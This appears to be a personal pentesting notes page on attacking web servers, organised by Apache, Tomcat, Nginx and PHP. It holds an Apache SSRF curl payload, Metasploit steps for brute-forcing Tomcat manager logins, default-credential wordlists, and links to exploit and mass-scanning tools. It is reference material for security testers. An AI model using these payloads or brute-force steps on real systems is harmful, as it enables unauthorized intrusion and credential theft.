---
layout: notes
permalink: /notes/tech/server/
title: Pentesting Web Servers
---

# Pentesting Web Servers

## Apache
```bash
#SSRF
$ curl "http://localhost/?unix:$(python3 -c 'print("A"*7701, end="")')|http://backend_server1:8085/"> <html>ssrf test</html>
```

## Apache Tomcat
```bash
#Metasploit Tomcat Bruteforce
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > show actions
msf auxiliary(tomcat_mgr_login) > set ACTION < action-name >
msf auxiliary(tomcat_mgr_login) > show options
msf auxiliary(tomcat_mgr_login) > run

#Seclists Wordlsits
/Discovery/Web-Content/tomcat.txt
/Discovery/Web-Content/ApacheTomcat.fuzz.txt
/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```
Tools:\
[AJPy](https://github.com/hypn0s/AJPy) - AJPy aims to craft AJP requests in order to communicate with AJP connectors.\
[Mass Scanner for CVE-2020-9484](https://github.com/osamahamad/CVE-2020-9484-Mass-Scan) - Scan a list of urls against Apache Tomcat deserialization (CVE-2020-9484) which could lead to RCE, determine possible vulnerable hosts.\
\
Additional references
[hacktricks](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/tomcat)

## Nginx
[nginxpwner tool](https://github.com/stark0de/nginxpwner)\
[CVE-2019-11043](https://github.com/jas502n/CVE-2019-11043)\
[Path Traversal](https://medium.com/appsflyerengineering/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d)

## PHP
```bash
#Php vulnerabilities
https://infosecwriteups.com/vulnerabilities-in-php-based-applications-fb6224865d43

#Details: Introducing lightyear: a new way to dump PHP files
https://www.ambionics.io/blog/lightyear-file-dump

#Exploit: GitHub - ambionics/lightyear: lightyear is a tool to dump files in tedious (blind) conditions using PHP filters
https://github.com/ambionics/lightyear

#phpMyAdmin
https://www.securitynewspaper.com/2020/11/30/how-to-hack-mysql-databases-pentesting-phpmyadmin/
https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/
```